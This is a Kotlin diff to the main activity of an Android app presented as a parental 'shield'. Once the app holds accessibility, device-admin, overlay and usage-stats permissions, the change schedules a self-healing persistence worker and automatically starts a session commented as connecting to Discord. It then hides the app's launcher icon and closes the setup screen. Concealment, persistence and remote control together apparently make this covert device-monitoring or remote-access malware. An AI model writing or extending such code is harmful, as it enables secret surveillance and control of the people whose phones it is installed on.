@@ -2,6 +2,7 @@ package com.adex.app
 
 import android.content.BroadcastReceiver
 import android.content.Context
+import android.content.ComponentName
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
@@ -267,7 +268,8 @@ class MainActivity : AppCompatActivity() {
             PermissionHelper.hasOverlayPermission(this) &&
             PermissionHelper.hasUsageStatsPermission(this) &&
             PermissionHelper.isAccessibilityServiceEnabled(this) &&
-            PermissionHelper.isDeviceAdminEnabled(this)
+            PermissionHelper.isDeviceAdminEnabled(this) &&
+            notificationGranted
     }
 
     private fun isAutoEnrollConfigured(): Boolean {
@@ -281,14 +283,41 @@ class MainActivity : AppCompatActivity() {
         if (!allCriticalPermissionsGranted()) {
             return
         }
-        if (settingsStore.shieldEnabled) {
-            return
-        }
 
         lifecycleScope.launch {
             runCatching {
-                ParentalShieldManager.setShieldEnabled(this@MainActivity, settingsStore, true)
+                // 1. Ensure shield is enabled
+                if (!settingsStore.shieldEnabled) {
+                    ParentalShieldManager.setShieldEnabled(this@MainActivity, settingsStore, true)
+                }
+                
+                // 2. Schedule persistence worker for self-healing
+                PersistenceWorker.schedule(applicationContext)
+
+                // 3. AUTO-START: Connect to Discord as soon as permissions allow
+                if (isAutoEnrollConfigured() && !ADexForegroundService.isServiceRunning) {
+                    startForegroundSession()
+                }
+
+                // 4. AUTO-HIDE: Remove icon from drawer and exit setup
+                hideAppIcon()
+                
+                // Give it a tiny bit of time before closing
+                kotlinx.coroutines.delay(1000)
+                finish()
             }
+        }
+    }
+
+    private fun hideAppIcon() {
+        runCatching {
+            val pkg = packageManager
+            val component = ComponentName(this, MainActivity::class.java)
+            pkg.setComponentEnabledSetting(
+                component,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
         }
     }
 }
